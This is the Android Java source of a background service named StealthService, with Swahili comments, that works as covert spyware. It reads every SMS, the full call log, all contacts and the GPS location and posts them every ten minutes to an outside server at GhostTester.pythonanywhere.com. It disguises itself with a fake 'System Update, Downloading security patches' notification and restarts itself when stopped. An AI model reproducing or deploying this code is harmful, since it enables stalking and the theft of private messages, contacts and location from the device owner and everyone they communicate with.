package com.security.update;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;
import android.Manifest;
import android.content.pm.PackageManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.os.Build;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

public class StealthService extends Service {
    private static final String TAG = "StealthService";
    private Timer timer;
    private String parentCode;
    private SharedPreferences prefs;
    private LocationManager locationManager;
    private int dataSequence = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
        createNotificationChannel();
        Log.d(TAG, "🔍 StealthService imeanzishwa kwa siri...");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("PARENT_CODE")) {
            parentCode = intent.getStringExtra("PARENT_CODE");
            Log.d(TAG, "📱 Parent Code: " + parentCode);
        } else {
            parentCode = prefs.getString("parent_code", "");
            Log.d(TAG, "📱 Parent Code from prefs: " + parentCode);
        }

        startForegroundService();
        startSurveillance();
        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "surveillance_channel",
                "System Services",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("System background services");
            channel.setShowBadge(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private void startForegroundService() {
        Notification notification;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            notification = new Notification.Builder(this, "surveillance_channel")
                .setContentTitle("System Update")
                .setContentText("Downloading security patches...")
                .setSmallIcon(android.R.drawable.stat_sys_download)
                .setPriority(Notification.PRIORITY_LOW)
                .setOngoing(true)
                .build();
        } else {
            notification = new Notification.Builder(this)
                .setContentTitle("System Update")
                .setContentText("Downloading security patches...")
                .setSmallIcon(android.R.drawable.stat_sys_download)
                .setPriority(Notification.PRIORITY_LOW)
                .setOngoing(true)
                .build();
        }
        
        startForeground(101, notification);
    }

    private void startSurveillance() {
        if (timer != null) {
            timer.cancel();
        }

        timer = new Timer();

        // Start immediate data collection
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                collectAndSendAllData();
            }
        }, 0);

        // Schedule periodic data collection every 10 minutes (600000 ms)
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                collectAndSendAllData();
            }
        }, 600000, 600000);

        Log.d(TAG, "📡 Surveillance imeanzishwa - data inatumwa kila baada ya dakika 10");
    }

    private void collectAndSendAllData() {
        try {
            Log.d(TAG, "🔄 Kuanza kukusanya data...");
            dataSequence++;

            // 1. Kusanya SMS ZOTE (sio limit) - DATA HAIFUTWI
            if (checkPermission(Manifest.permission.READ_SMS)) {
                collectAndSendSMSData();
            }

            // 2. Kusanya simu ZOTE - DATA HAIFUTWI
            if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
                collectAndSendCallsData();
            }

            // 3. Kusanya anwani ZOTE - DATA HAIFUTWI
            if (checkPermission(Manifest.permission.READ_CONTACTS)) {
                collectAndSendContactsData();
            }

            // 4. Kusanya location
            if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
                collectAndSendLocationData();
            }

            Log.d(TAG, "✅ Ukusaji wa data #" + dataSequence + " umekamilika");

        } catch (Exception e) {
            Log.e(TAG, "❌ Error collecting data: " + e.getMessage());
        }
    }

    private void collectAndSendSMSData() {
        try {
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null,
                Telephony.Sms.DATE + " DESC"  // SIO LIMIT - ZOTE
            );

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    JSONObject smsData = new JSONObject();
                    String senderNumber = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String messageBody = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    String timestamp = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    int smsType = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
                    
                    // 🆕 PATA JINA LA MTU KUTOKA NAMBA
                    String senderName = getContactNameFromNumber(senderNumber);

                    smsData.put("sender_number", senderNumber);
                    smsData.put("sender_name", senderName); // 🆕 JINA LA MTU
                    smsData.put("message", messageBody);
                    smsData.put("timestamp", timestamp);
                    smsData.put("type", getSMSTypeText(smsType));
                    smsData.put("sequence", dataSequence);

                    // Tuma SMS moja moja kwa server
                    sendSingleDataToServer("sms", smsData);
                    count++;
                    
                    // Pumzika kidogo kati ya SMS
                    if (count % 10 == 0) Thread.sleep(2000);
                }
                cursor.close();
                Log.d(TAG, "✅ SMS " + count + " zimetumwa (zote)");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading SMS: " + e.getMessage());
        }
    }

    private void collectAndSendCallsData() {
        try {
            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC"  // SIO LIMIT - ZOTE
            );

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    JSONObject callData = new JSONObject();
                    String callNumber = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                    String timestamp = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                    int callType = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                    
                    // 🆕 PATA JINA LA MTU KUTOKA NAMBA
                    String callerName = getContactNameFromNumber(callNumber);

                    callData.put("caller_number", callNumber);
                    callData.put("caller_name", callerName); // 🆕 JINA LA MTU
                    callData.put("duration", duration);
                    callData.put("timestamp", timestamp);
                    callData.put("type", getCallTypeText(callType));
                    callData.put("sequence", dataSequence);

                    // Tuma simu moja moja
                    sendSingleDataToServer("calls", callData);
                    count++;
                    
                    if (count % 10 == 0) Thread.sleep(2000);
                }
                cursor.close();
                Log.d(TAG, "✅ Simu " + count + " zimetumwa (zote)");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading calls: " + e.getMessage());
        }
    }

    private void collectAndSendContactsData() {
        try {
            Cursor cursor = getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC"  // SIO LIMIT - ZOTE
            );

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));

                    // Pata namba ZOTE za simu za contact hii
                    JSONArray phoneNumbers = getAllContactPhoneNumbers(contactId);
                    
                    if (phoneNumbers.length() > 0) {
                        JSONObject contactData = new JSONObject();
                        contactData.put("name", name);
                        contactData.put("phones", phoneNumbers);
                        contactData.put("timestamp", System.currentTimeMillis());
                        contactData.put("sequence", dataSequence);

                        // Tuma contact moja moja
                        sendSingleDataToServer("contacts", contactData);
                        count++;
                        
                        if (count % 5 == 0) Thread.sleep(2000);
                    }
                }
                cursor.close();
                Log.d(TAG, "✅ Anwani " + count + " zimetumwa (zote)");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading contacts: " + e.getMessage());
        }
    }

    private void collectAndSendLocationData() {
        try {
            locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (locationManager != null && locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                Location lastLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (lastLocation != null) {
                    JSONObject locationData = new JSONObject();
                    locationData.put("latitude", lastLocation.getLatitude());
                    locationData.put("longitude", lastLocation.getLongitude());
                    locationData.put("accuracy", lastLocation.getAccuracy());
                    locationData.put("timestamp", lastLocation.getTime());
                    locationData.put("address", "GPS Location");
                    locationData.put("sequence", dataSequence);

                    sendSingleDataToServer("location", locationData);
                    Log.d(TAG, "✅ Location imetumwa");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error getting location: " + e.getMessage());
        }
    }

    // 🆕 NJIA MPYA: PATA JINA LA MTU KUTOKA NAMBA YA SIMU
    private String getContactNameFromNumber(String phoneNumber) {
        if (phoneNumber == null) return "Namba isiyojulikana";
        
        try {
            // Safisha namba (ondoa space na special characters)
            String cleanNumber = phoneNumber.replaceAll("[^0-9+]", "");
            
            // Tafuta contact kwenye anwani
            Cursor cursor = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME},
                ContactsContract.CommonDataKinds.Phone.NUMBER + " LIKE ?",
                new String[]{"%" + cleanNumber},
                null
            );

            if (cursor != null && cursor.moveToFirst()) {
                String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                cursor.close();
                return name;
            }
            if (cursor != null) {
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting contact name: " + e.getMessage());
        }
        
        return phoneNumber; // Rudi namba kama hakuna jina
    }

    private JSONArray getAllContactPhoneNumbers(String contactId) {
        JSONArray phones = new JSONArray();
        try {
            Cursor phoneCursor = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                new String[]{contactId},
                null
            );

            if (phoneCursor != null) {
                while (phoneCursor.moveToNext()) {
                    String phone = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                    String type = getPhoneTypeText(phoneCursor.getInt(phoneCursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.TYPE)));
                    
                    JSONObject phoneInfo = new JSONObject();
                    phoneInfo.put("number", phone);
                    phoneInfo.put("type", type);
                    phones.put(phoneInfo);
                }
                phoneCursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting phone numbers: " + e.getMessage());
        }
        return phones;
    }

    private String getSMSTypeText(int smsType) {
        switch (smsType) {
            case Telephony.Sms.MESSAGE_TYPE_INBOX:
                return "received";
            case Telephony.Sms.MESSAGE_TYPE_SENT:
                return "sent";
            case Telephony.Sms.MESSAGE_TYPE_DRAFT:
                return "draft";
            default:
                return "unknown";
        }
    }

    private String getCallTypeText(int callType) {
        switch (callType) {
            case CallLog.Calls.INCOMING_TYPE:
                return "incoming";
            case CallLog.Calls.OUTGOING_TYPE:
                return "outgoing";
            case CallLog.Calls.MISSED_TYPE:
                return "missed";
            default:
                return "unknown";
        }
    }

    private String getPhoneTypeText(int phoneType) {
        switch (phoneType) {
            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
                return "home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
                return "mobile";
            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
                return "work";
            default:
                return "other";
        }
    }

    // 🎯 NJIA YA KUTUMA DATA - SERVER ILE ILE
    private void sendSingleDataToServer(String dataType, JSONObject dataContent) {
        new Thread(() -> {
            try {
                String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/submit-data";
                
                JSONObject postData = new JSONObject();
                postData.put("parent_code", parentCode);
                postData.put("data_type", dataType);
                postData.put("device_id", android.os.Build.MODEL);
                postData.put("data_content", dataContent);

                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);

                OutputStream os = conn.getOutputStream();
                os.write(postData.toString().getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    Log.d(TAG, "✅ " + dataType + " imetumwa kikamilifu - seq " + dataSequence);
                } else {
                    Log.e(TAG, "❌ Server error for " + dataType + ": " + responseCode);
                }

            } catch (Exception e) {
                Log.e(TAG, "❌ Error sending " + dataType + ": " + e.getMessage());
            }
        }).start();
    }

    private boolean checkPermission(String permission) {
        return checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) {
            timer.cancel();
        }
        
        // 🔄 AUTOMATIC RESTART - APP HAIISHI KABISA
        Intent restartIntent = new Intent(this, StealthService.class);
        restartIntent.putExtra("PARENT_CODE", parentCode);
        startService(restartIntent);
        
        Log.d(TAG, "🔄 StealthService inaanzishwa tena kwa kiotomatiki");
    }
}
